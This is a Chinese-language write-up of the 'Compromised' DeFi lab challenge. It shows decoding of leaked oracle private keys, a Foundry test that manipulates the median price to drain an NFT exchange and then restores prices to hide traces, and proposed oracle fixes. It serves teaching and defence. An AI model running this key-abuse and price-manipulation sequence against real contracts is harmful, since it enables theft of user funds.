# Compromised 漏洞分析

## 1. 合约功能概述

`Exchange` 是一个 NFT 交易所,依赖链上预言机提供价格数据。

**核心组件：**
- **Exchange.sol**: NFT 交易所，买卖 DVNFT（基于预言机价格）
- **TrustfulOracle.sol**: 价格预言机，取 3 个可信源的中位数作为价格
- **DamnValuableNFT.sol**: ERC721 NFT 合约

**业务流程：**
1. 预言机由 3 个可信地址报价（0x188...088, 0xA41...9D8, 0xab3...a40）
2. Exchange 从预言机获取 DVNFT 的中位数价格
3. 用户以预言机价格买入/卖出 NFT
4. Exchange 有 999 ETH 余额，初始 NFT 价格 999 ETH

---

## 2. 漏洞位置

### 漏洞：预言机私钥泄露

**泄露的信息（HTTP 响应）：**
```
4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

**解码过程：**
```
步骤1: 十六进制 → ASCII
4d 48 67 33... → "MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZmZjOTkzMDYzNzQ0"

步骤2: Base64 解码
"MHg3ZDE1..." → "0x7d15bba26c52368..." (私钥1)
"MHg2OGJkMDIw..." → "0x68bd020ad18..." (私钥2)

步骤3: 从私钥恢复地址
私钥1 → 0x188Ea627E3531Db590e6f1D71ED83628d1933088 (source[0]) ✅
私钥2 → 0xA417D473c40a4d42BAd35f147c21eEa7973539D8 (source[1]) ✅
```

### 预言机实现（TrustfulOracle.sol）

```solidity
function postPrice(string calldata symbol, uint256 newPrice) 
    external 
    onlyRole(TRUSTED_SOURCE_ROLE) 
{
    _setPrice(msg.sender, symbol, newPrice);
}

function getMedianPrice(string calldata symbol) external view returns (uint256) {
    return _computeMedianPrice(symbol);
}

function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = getAllPricesForSymbol(symbol);
    LibSort.insertionSort(prices);
    
    // 取中位数
    if (prices.length % 2 == 0) {
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    } else {
        return prices[prices.length / 2];
    }
}
```

### Exchange 买卖逻辑（Exchange.sol）

```solidity
function buyOne() external payable nonReentrant returns (uint256 id) {
    if (msg.value == 0) {
        revert InvalidPayment();
    }

    // ⚠️ 完全信任预言机价格
    uint256 price = oracle.getMedianPrice(token.symbol());
    if (msg.value < price) {
        revert InvalidPayment();
    }

    id = token.safeMint(msg.sender);
    unchecked {
        payable(msg.sender).sendValue(msg.value - price);
    }

    emit TokenBought(msg.sender, id, price);
}

function sellOne(uint256 id) external nonReentrant {
    if (msg.sender != token.ownerOf(id)) {
        revert SellerNotOwner(id);
    }

    if (token.getApproved(id) != address(this)) {
        revert TransferNotApproved();
    }

    // ⚠️ 完全信任预言机价格
    uint256 price = oracle.getMedianPrice(token.symbol());
    if (address(this).balance < price) {
        revert NotEnoughFunds();
    }

    token.transferFrom(msg.sender, address(this), id);
    token.burn(id);

    payable(msg.sender).sendValue(price);

    emit TokenSold(msg.sender, id, price);
}
```

---

## 3. 漏洞原理分析

### 3.1 预言机操纵

**正常预言机流程：**
```
3 个独立的源报价:
- Source 0: 999 ETH
- Source 1: 999 ETH
- Source 2: 999 ETH
中位数 = 999 ETH ✅
```

**攻击者控制 2 个源后：**
```
- Source 0 (被控): 0.001 ETH
- Source 1 (被控): 0.001 ETH
- Source 2 (安全): 999 ETH
排序: [0.001, 0.001, 999]
中位数 = 0.001 ETH ❌
```

**为什么控制 2 个源就够了：**
```
3 个源的中位数计算:
- 控制 0 个: 无法操纵
- 控制 1 个: [恶意, 正常, 正常] → 正常 ✅
- 控制 2 个: [恶意, 恶意, 正常] → 恶意 ❌
- 控制 3 个: 完全控制
```

### 3.2 价格操纵攻击

**攻击流程：**
```
1. 降低价格（买入阶段）
   - Source 0 报价: 1 wei
   - Source 1 报价: 1 wei
   - 中位数 = 1 wei
   - 攻击者用 1 wei 买入 NFT

2. 提高价格（卖出阶段）
   - Source 0 报价: 999 ETH
   - Source 1 报价: 999 ETH
   - 中位数 = 999 ETH
   - 攻击者卖出 NFT 获得 999 ETH

3. 恢复价格（掩盖痕迹）
   - Source 0 报价: 999 ETH
   - Source 1 报价: 999 ETH
   - 中位数恢复到 999 ETH
```

**净利润计算：**
```
初始余额: 0.1 ETH
买入成本: 0.001 ETH (实际只需 1 wei)
卖出收入: 999 ETH
净利润: 999 - 0.001 = 998.999 ETH

Exchange 余额: 999 → 0 ETH
攻击者余额: 0.1 → 999.1 ETH
```

### 3.3 为什么会有这个漏洞

**根本原因：**
1. **私钥泄露**: 预言机私钥通过不安全的渠道暴露
2. **中心化风险**: 只有 3 个价格源，门槛低
3. **即时生效**: 价格修改立即生效，无延迟或审查
4. **无异常检测**: 没有检测异常价格波动
5. **完全信任**: Exchange 完全信任预言机，无二次验证

**设计缺陷：**
- 预言机源数量太少（3 个）
- 没有价格聚合器的多源验证
- 缺少价格变动限制（如最大涨跌幅）
- 没有时间加权平均价格（TWAP）
- 私钥管理不当（通过 HTTP 响应泄露）

---

## 4. 修复方案

### 方案一：增加预言机源数量（推荐）

```solidity
contract TrustfulOracle {
    // ✅ 增加到至少 7 个源
    uint256 public constant MIN_SOURCES = 7;
    
    constructor(address[] memory sources) {
        require(sources.length >= MIN_SOURCES, "Too few sources");
        // ...
    }
    
    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = getAllPricesForSymbol(symbol);
        
        // ✅ 移除异常值（最高和最低价）
        LibSort.insertionSort(prices);
        
        // 去掉最高和最低
        uint256[] memory trimmedPrices = new uint256[](prices.length - 2);
        for (uint256 i = 1; i < prices.length - 1; i++) {
            trimmedPrices[i - 1] = prices[i];
        }
        
        // 计算平均值而非中位数
        uint256 sum = 0;
        for (uint256 i = 0; i < trimmedPrices.length; i++) {
            sum += trimmedPrices[i];
        }
        return sum / trimmedPrices.length;
    }
}
```

**为什么有效：**
- 7 个源需要控制 4 个才能操纵中位数（成本更高）
- 移除异常值进一步增加攻击难度
- 使用平均值降低单点影响

### 方案二：价格变动限制

```solidity
contract Exchange {
    uint256 public constant MAX_PRICE_CHANGE_PERCENT = 10; // 10%
    uint256 public lastPrice;
    uint256 public lastPriceUpdateTime;
    
    function buyOne() external payable nonReentrant returns (uint256 id) {
        uint256 newPrice = oracle.getMedianPrice(token.symbol());
        
        // ✅ 检查价格变动幅度
        if (lastPrice > 0) {
            uint256 priceChange = newPrice > lastPrice
                ? (newPrice - lastPrice) * 100 / lastPrice
                : (lastPrice - newPrice) * 100 / lastPrice;
            
            require(
                priceChange <= MAX_PRICE_CHANGE_PERCENT,
                "Price changed too much"
            );
        }
        
        lastPrice = newPrice;
        lastPriceUpdateTime = block.timestamp;
        
        // ... rest of the code
    }
}
```

**为什么有效：**
- 限制单次价格变动幅度
- 攻击者无法在单个区块内从 999 ETH 降到 1 wei
- 需要多个交易逐步调整价格（增加成本和风险）

### 方案三：时间加权平均价格（TWAP）

```solidity
contract TWAPOracle {
    struct PriceObservation {
        uint256 timestamp;
        uint256 price;
    }
    
    mapping(string => PriceObservation[]) public observations;
    uint256 public constant TWAP_PERIOD = 1 hours;
    
    function postPrice(string calldata symbol, uint256 newPrice) 
        external 
        onlyRole(TRUSTED_SOURCE_ROLE) 
    {
        observations[symbol].push(PriceObservation({
            timestamp: block.timestamp,
            price: newPrice
        }));
        
        // 清理过期数据
        _cleanOldObservations(symbol);
    }
    
    // ✅ 返回时间加权平均价格
    function getTWAP(string calldata symbol) external view returns (uint256) {
        PriceObservation[] storage obs = observations[symbol];
        require(obs.length > 0, "No observations");
        
        uint256 cutoffTime = block.timestamp - TWAP_PERIOD;
        uint256 weightedSum = 0;
        uint256 totalWeight = 0;
        
        for (uint256 i = 0; i < obs.length; i++) {
            if (obs[i].timestamp >= cutoffTime) {
                uint256 weight = block.timestamp - obs[i].timestamp;
                weightedSum += obs[i].price * weight;
                totalWeight += weight;
            }
        }
        
        return weightedSum / totalWeight;
    }
}
```

**为什么有效：**
- 价格是过去一段时间的平均值
- 单次价格操纵影响有限
- 需要长期控制价格才能攻击（成本极高）

### 方案四：多预言机聚合

```solidity
contract AggregatedOracle {
    ITrustfulOracle public oracle1;
    IChainlink public oracle2;
    IUniswapV3 public oracle3;
    
    // ✅ 使用多个独立预言机
    function getPrice(string calldata symbol) external view returns (uint256) {
        uint256 price1 = oracle1.getMedianPrice(symbol);
        uint256 price2 = oracle2.getPrice(symbol);
        uint256 price3 = oracle3.getTWAP(symbol);
        
        // 检查价格偏差
        uint256 maxPrice = max(price1, price2, price3);
        uint256 minPrice = min(price1, price2, price3);
        
        require(
            (maxPrice - minPrice) * 100 / minPrice <= 5,
            "Price sources diverged"
        );
        
        // 返回中位数
        return median(price1, price2, price3);
    }
}
```

**为什么有效：**
- 需要同时操纵多个独立预言机（几乎不可能）
- 价格偏差检查能及时发现攻击
- 使用去中心化的 Uniswap TWAP 作为参考

### 方案五：私钥安全管理

```
✅ DO:
- 使用硬件钱包存储预言机私钥
- 多签机制（需要 M-of-N 签名才能报价）
- 定期轮换私钥
- 使用 HSM（硬件安全模块）
- 监控异常报价行为

❌ DON'T:
- 在代码或配置文件中硬编码私钥
- 通过不安全的渠道传输私钥
- 使用弱密码保护私钥
- 在公共服务器上存储私钥
```

---

## 5. Proof of Concept

### 解码泄露的私钥

```python
# 步骤1: 十六进制转 ASCII
hex1 = "4d48673...7a51304e44633154546b7a4d44597a4e7a51304e44453d"
ascii1 = bytes.fromhex(hex1).decode('ascii')
# "MHg3ZDE1YmJhMjZjNTIz..."

# 步骤2: Base64 解码
import base64
privateKey1 = base64.b64decode(ascii1).decode('ascii')
# "0x7d15bba26c523683bfc3dc7cd5d1b8a2744447597cf4da1705cffc99306374"

# 验证地址
from eth_account import Account
account1 = Account.from_key(privateKey1)
print(account1.address)
# 0x188Ea627E3531Db590e6f1D71ED83628d1933088 ✅
```

### 攻击代码（Solidity）

```solidity
function test_compromised() public {
    // 解码得到的私钥对应的地址
    address source0 = sources[0];  // 0x188...088
    address source1 = sources[1];  // 0xA41...9D8
    
    // ===== 阶段1: 降低价格 =====
    vm.startPrank(source0);
    oracle.postPrice("DVNFT", 1 wei);
    vm.stopPrank();
    
    vm.startPrank(source1);
    oracle.postPrice("DVNFT", 1 wei);
    vm.stopPrank();
    
    // 验证中位数价格
    // [1 wei, 1 wei, 999 ETH] → 中位数 = 1 wei
    uint256 manipulatedPrice = oracle.getMedianPrice("DVNFT");
    assertEq(manipulatedPrice, 1 wei);
    
    // ===== 阶段2: 低价买入 NFT =====
    vm.startPrank(player);
    uint256 tokenId = exchange.buyOne{value: 1 wei}();
    vm.stopPrank();
    
    // ===== 阶段3: 提高价格 =====
    uint256 drainAmount = address(exchange).balance;  // 999 ETH
    
    vm.startPrank(source0);
    oracle.postPrice("DVNFT", drainAmount);
    vm.stopPrank();
    
    vm.startPrank(source1);
    oracle.postPrice("DVNFT", drainAmount);
    vm.stopPrank();
    
    // 验证中位数价格
    // [999 ETH, 999 ETH, 1 wei] → 中位数 = 999 ETH
    manipulatedPrice = oracle.getMedianPrice("DVNFT");
    assertEq(manipulatedPrice, drainAmount);
    
    // ===== 阶段4: 高价卖出 NFT =====
    vm.startPrank(player);
    nft.approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);
    
    // 转移利润到 recovery
    payable(recovery).transfer(drainAmount);
    vm.stopPrank();
    
    // ===== 阶段5: 恢复价格（掩盖痕迹）=====
    vm.startPrank(source0);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();
    
    vm.startPrank(source1);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.stopPrank();
}
```

### 攻击流程详解

```
初始状态:
├─ Exchange: 999 ETH
├─ Player: 0.1 ETH
├─ Oracle: 源[0,1,2] 都报 999 ETH
└─ NFT 价格: 999 ETH

阶段1: 操纵价格(降低)
│
├─ 源0 (被攻破): postPrice("DVNFT", 1 wei)
├─ 源1 (被攻破): postPrice("DVNFT", 1 wei)
└─ 价格数组: [1 wei, 1 wei, 999 ETH]
    └─ 排序后: [1 wei, 1 wei, 999 ETH]
        └─ 中位数 = 1 wei ✅

阶段2: 低价买入
│
├─ player.buyOne{value: 1 wei}()
│   ├─ 预言机价格 = 1 wei
│   ├─ msg.value (1 wei) >= 价格 (1 wei) ✅
│   ├─ mint NFT #0 给 player
│   └─ 退款: 1 wei - 1 wei = 0
│
└─ Player 获得 NFT #0

阶段3: 操纵价格(提高)
│
├─ 源0: postPrice("DVNFT", 999 ETH)
├─ 源1: postPrice("DVNFT", 999 ETH)
└─ 价格数组: [999 ETH, 999 ETH, 1 wei]
    └─ 排序后: [1 wei, 999 ETH, 999 ETH]
        └─ 中位数 = 999 ETH ✅

阶段4: 高价卖出
│
├─ nft.approve(exchange, tokenId)
├─ player.sellOne(tokenId)
│   ├─ 预言机价格 = 999 ETH
│   ├─ exchange.balance (999 ETH) >= 价格 (999 ETH) ✅
│   ├─ burn NFT #0
│   └─ 支付 999 ETH 给 player
│
└─ Player 余额: 0.1 + 999 = 999.1 ETH

阶段5: 恢复价格
│
├─ 源0: postPrice("DVNFT", 999 ETH)
├─ 源1: postPrice("DVNFT", 999 ETH)
└─ 价格数组: [999 ETH, 999 ETH, 999 ETH]
    └─ 中位数 = 999 ETH (恢复正常)

最终状态:
├─ Exchange: 0 ETH
├─ Recovery: 999 ETH ✅
└─ Oracle: 价格恢复到 999 ETH (掩盖痕迹)
```

---

## 6. 关键要点总结

| 维度 | 说明 |
|------|------|
| **攻击成本** | 需要获得 2/3 预言机私钥（本例中泄露）|
| **攻击影响** | 完全掏空 Exchange（999 ETH）|
| **漏洞类型** | 预言机操纵 + 私钥泄露 |
| **根本原因** | 预言机源太少 + 私钥管理不当 + 无价格验证 |
| **修复难度** | 高，需要重新设计预言机架构 |
| **安全启示** | 永远不要完全信任单一预言机，需要多重验证 |

---

## 7. 扩展思考

### 真实案例参考

**Mango Markets (2022) - 1.14 亿美元损失**
```
攻击步骤:
1. 攻击者在 FTX 和 Mango 之间操纵 MNGO 代币价格
2. 在 Mango 上做多 MNGO 永续合约
3. 在 FTX 上用大量资金拉高 MNGO 现货价格
4. Mango 的预言机（Pyth）反映了被操纵的价格
5. 攻击者的抵押品价值暴涨，借出所有可借资产
6. 让 MNGO 价格回落，带走借出的资产
```

**Cream Finance (2021) - 1.3 亿美元损失**
```
攻击向量:
1. 使用闪电贷操纵 LP token 价格
2. Cream 的预言机基于 Uniswap V2 储备量
3. 攻击者在单个交易中操纵储备量
4. 以虚高的抵押品价值借出资产
```

**Harvest Finance (2020) - 2400 万美元损失**
```
攻击原理:
1. 操纵 Curve 池子的价格
2. Harvest 的策略依赖 Curve 价格
3. 通过大额交易影响价格
4. 套利获取利润
```

### 预言机攻击分类

1. **价格操纵攻击**
   - 闪电贷操纵 AMM 价格
   - 低流动性操纵
   - 三明治攻击

2. **数据源攻击**
   - 私钥泄露（本案例）
   - 节点作恶
   - 中心化风险

3. **延迟攻击**
   - 利用价格更新延迟
   - 前置交易
   - 抢跑

4. **聚合器攻击**
   - 操纵单一数据源影响聚合结果
   - 异常值攻击

### 防御最佳实践

```solidity
✅ DO: 使用去中心化预言机（Chainlink, Band Protocol）
✅ DO: 多预言机聚合验证
✅ DO: 实施 TWAP（时间加权平均价格）
✅ DO: 价格变动限制和熔断机制
✅ DO: 异常检测和报警
✅ DO: 使用多源价格偏差检查
✅ DO: 私钥多签和硬件钱包
✅ DO: 定期审计和渗透测试

❌ DON'T: 使用少于 7 个独立价格源
❌ DON'T: 完全信任单一预言机
❌ DON'T: 使用可被闪电贷操纵的价格源
❌ DON'T: 忽视价格异常波动
❌ DON'T: 在不安全的地方存储私钥
❌ DON'T: 使用即时价格而非 TWAP
```

### 安全的预言机集成

```solidity
contract SecureExchange {
    IChainlinkOracle public chainlink;
    IUniswapV3Oracle public uniswap;
    uint256 public constant MAX_PRICE_DEVIATION = 5; // 5%
    
    function getSecurePrice(string calldata symbol) internal view returns (uint256) {
        // 从多个源获取价格
        uint256 chainlinkPrice = chainlink.getPrice(symbol);
        uint256 uniswapTWAP = uniswap.getTWAP(symbol, 1 hours);
        
        // 检查价格偏差
        uint256 deviation = chainlinkPrice > uniswapTWAP
            ? (chainlinkPrice - uniswapTWAP) * 100 / uniswapTWAP
            : (uniswapTWAP - chainlinkPrice) * 100 / chainlinkPrice;
        
        require(deviation <= MAX_PRICE_DEVIATION, "Price deviation too high");
        
        // 使用两者的平均值
        return (chainlinkPrice + uniswapTWAP) / 2;
    }
    
    function buyOne() external payable returns (uint256) {
        uint256 price = getSecurePrice("DVNFT");
        
        // 检查价格变动
        require(
            _isPriceChangeReasonable(price),
            "Suspicious price change"
        );
        
        // ... rest of logic
    }
}
```

### Chainlink 预言机的安全特性

```
✅ 去中心化节点网络（数十到数百个节点）
✅ 信誉系统和经济激励
✅ 多层聚合和离群值过滤
✅ 数据加密和签名验证
✅ OCR（链下计算报告）降低成本
✅ VRF（可验证随机函数）用于随机数
✅ Keeper 网络用于自动化任务
✅ 审计和形式化验证
```

---

## 附录：HTTP 响应解码脚本

### Python 解码脚本

```python
import base64
from eth_account import Account

# 泄露的十六进制数据
hex_data_1 = "4d48673...4e44633154546b7a4d44597a4e7a51304e44453d"
hex_data_2 = "4d48677...62594d33333242304d54553d"

def decode_leaked_key(hex_string):
    # 步骤1: 十六进制 → ASCII
    ascii_string = bytes.fromhex(hex_string).decode('ascii')
    print(f"Base64: {ascii_string}")
    
    # 步骤2: Base64 → 私钥
    private_key = base64.b64decode(ascii_string).decode('ascii')
    print(f"Private Key: {private_key}")
    
    # 步骤3: 私钥 → 地址
    account = Account.from_key(private_key)
    print(f"Address: {account.address}")
    
    return private_key, account.address

# 解码两个私钥
print("=== 泄露的私钥 1 ===")
key1, addr1 = decode_leaked_key(hex_data_1)

print("\n=== 泄露的私钥 2 ===")
key2, addr2 = decode_leaked_key(hex_data_2)

# 验证地址
expected_sources = [
    "0x188Ea627E3531Db590e6f1D71ED83628d1933088",
    "0xA417D473c40a4d42BAd35f147c21eEa7973539D8",
    "0xab3600bF153A316dE44827e2473056d56B774a40"
]

print("\n=== 验证 ===")
print(f"私钥1对应源: {addr1 in expected_sources}")
print(f"私钥2对应源: {addr2 in expected_sources}")
```

### JavaScript 解码脚本

```javascript
const ethers = require('ethers');

// 泄露的十六进制数据
const hexData1 = "4d48673...";
const hexData2 = "4d48677...";

function decodeLeakedKey(hexString) {
    // 步骤1: 十六进制 → ASCII
    const asciiString = Buffer.from(hexString, 'hex').toString('ascii');
    console.log(`Base64: ${asciiString}`);
    
    // 步骤2: Base64 → 私钥
    const privateKey = Buffer.from(asciiString, 'base64').toString('ascii');
    console.log(`Private Key: ${privateKey}`);
    
    // 步骤3: 私钥 → 地址
    const wallet = new ethers.Wallet(privateKey);
    console.log(`Address: ${wallet.address}`);
    
    return { privateKey, address: wallet.address };
}

// 解码
console.log("=== 泄露的私钥 1 ===");
const key1 = decodeLeakedKey(hexData1);

console.log("\n=== 泄露的私钥 2 ===");
const key2 = decodeLeakedKey(hexData2);
```

---

## 总结

Compromised 展示了一个基于私钥泄露的预言机操纵攻击：

**核心问题：** 预言机私钥通过不安全渠道泄露 + 源数量太少 + Exchange 完全信任预言机

**攻击链条：**
1. 解码泄露的私钥（HTTP 响应）
2. 控制 2/3 预言机源
3. 操纵价格到 1 wei
4. 低价买入 NFT
5. 操纵价格到 999 ETH
6. 高价卖出 NFT
7. 恢复价格掩盖痕迹

**防御要点：**
- 使用去中心化预言机（Chainlink）
- 多源聚合和偏差检查
- TWAP 而非即时价格
- 价格变动限制
- 安全的私钥管理

这是 DeFi 中最危险的攻击类型之一，已经造成了数亿美元的损失。它告诉我们：**预言机是 DeFi 的关键基础设施，必须用去中心化和多重验证来保护。**
